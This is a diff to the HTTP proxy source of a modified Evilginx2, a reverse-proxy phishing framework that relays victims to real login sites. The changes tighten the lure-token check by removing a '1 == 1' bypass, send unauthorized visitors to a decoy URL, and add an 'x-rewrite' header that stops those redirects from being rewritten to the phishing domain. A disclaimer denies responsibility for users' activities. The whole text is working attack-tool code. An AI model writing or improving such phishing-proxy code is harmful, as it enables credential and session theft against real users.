@@ -73,6 +73,8 @@ type ProxySession struct {
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*HttpProxy, error) {
+	log.Warning( "This is the modified maintained version of Evilginx2. No one will be held responsible for your activities." )
+	
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -155,14 +157,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								uv = req.URL.Query()
 								vv = uv.Get(p.cfg.verificationParam)
 							}
-							if l != nil || vv == p.cfg.verificationToken || 1 == 1{
+							if l != nil || vv == p.cfg.verificationToken {
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
-									log.Warning( "This is the modified maintained version of Evilginx2. No one will be held responsible for your activities" )
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
@@ -235,15 +236,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+	
 				// redirect for unauthorized requests
-				if ps.SessionId == "" && p.handleSession(req.Host) {
-					if !req_ok {
-						redirect_url := p.cfg.redirectUrl
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						if resp != nil {
-							resp.Header.Add("Location", redirect_url)
-							return req, resp
-						}
+				if ps.SessionId == "" && !req_ok {
+					redirect_url := p.cfg.redirectUrl
+					resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+					if resp != nil {
+						resp.Header.Add("Location", redirect_url)
+						resp.Header.Add("x-rewrite", "0")
+						return req, resp
 					}
 				}
 
@@ -515,9 +516,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
-			// if "Location" header is present, make sure to redirect to the phishing domain
+			// if "Location" header is present and it is not an intended breakout (ie unauthorized), make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
-			if err == nil {
+			x_overwrite := resp.Header.Get("x-rewrite")
+			if err == nil && x_overwrite == "" {
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
